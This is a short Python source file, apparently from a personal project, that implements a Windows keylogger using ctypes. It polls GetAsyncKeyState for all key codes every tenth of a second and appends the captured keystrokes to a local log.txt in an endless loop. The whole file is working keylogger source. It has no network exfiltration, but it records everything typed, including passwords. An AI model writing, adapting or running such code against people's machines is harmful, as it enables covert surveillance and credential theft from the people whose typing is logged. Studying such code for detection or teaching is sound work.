''' Keylogger @felmds

Implementação de um Keylogger com bibliotecas nativas'''

import ctypes #biblioteca par
import time
import os

# Constantes para capturar todas as teclas (baseadas nos códigos de scan)
VK_CODES = {
    0x08: 'BACKSPACE', 0x09: 'TAB', 0x0D: 'ENTER',
    0x10: 'SHIFT', 0x11: 'CTRL', 0x12: 'ALT',
    0x14: 'CAPS_LOCK', 0x1B: 'ESC', 0x20: 'SPACE',
    0x21: 'PAGE_UP', 0x22: 'PAGE_DOWN', 0x23: 'END',
    0x24: 'HOME', 0x25: 'LEFT_ARROW', 0x26: 'UP_ARROW',
    0x27: 'RIGHT_ARROW', 0x28: 'DOWN_ARROW', 0x2C: 'PRINT_SCREEN',
    0x2D: 'INSERT', 0x2E: 'DELETE', 0x30: '0', 0x31: '1',
    0x32: '2', 0x33: '3', 0x34: '4', 0x35: '5', 0x36: '6',
    0x37: '7', 0x38: '8', 0x39: '9', 0x41: 'A', 0x42: 'B',
    0x43: 'C', 0x44: 'D', 0x45: 'E', 0x46: 'F', 0x47: 'G',
    0x48: 'H', 0x49: 'I', 0x4A: 'J', 0x4B: 'K', 0x4C: 'L',
    0x4D: 'M', 0x4E: 'N', 0x4F: 'O', 0x50: 'P', 0x51: 'Q',
    0x52: 'R', 0x53: 'S', 0x54: 'T', 0x55: 'U', 0x56: 'V',
    0x57: 'W', 0x58: 'X', 0x59: 'Y', 0x5A: 'Z', 0x60: 'NUM_0',
    0x61: 'NUM_1', 0x62: 'NUM_2', 0x63: 'NUM_3', 0x64: 'NUM_4',
    0x65: 'NUM_5', 0x66: 'NUM_6', 0x67: 'NUM_7', 0x68: 'NUM_8',
    0x69: 'NUM_9', 0x6A: 'NUM_MULTIPLY', 0x6B: 'NUM_ADD',
    0x6C: 'NUM_SEPARATOR', 0x6D: 'NUM_SUBTRACT', 0x6E: 'NUM_DECIMAL',
    0x6F: 'NUM_DIVIDE', 0x70: 'F1', 0x71: 'F2', 0x72: 'F3',
    0x73: 'F4', 0x74: 'F5', 0x75: 'F6', 0x76: 'F7', 0x77: 'F8',
    0x78: 'F9', 0x79: 'F10', 0x7A: 'F11', 0x7B: 'F12',
    0x90: 'NUM_LOCK', 0x91: 'SCROLL_LOCK'
}

def get_key_name(vk_code):
    if vk_code in VK_CODES:
        return VK_CODES[vk_code]
    else:
        return chr(vk_code) if 0x20 <= vk_code <= 0x7E else None

# Função para verificar o estado das teclas
def check_key_state():
    buffer = ""
    for vk_code in range(256):
        if ctypes.windll.user32.GetAsyncKeyState(vk_code) & 0x8000:
            key_name = get_key_name(vk_code)
            if key_name:
                buffer += key_name + " "
    return buffer

# Função principal
def main():
    log_file_path = "log.txt"
    while True:
        keys_pressed = check_key_state()
        if keys_pressed:
            with open(log_file_path, "a") as log_file:
                log_file.write(keys_pressed + "\n")
        time.sleep(0.1)

if __name__ == "__main__":
    main()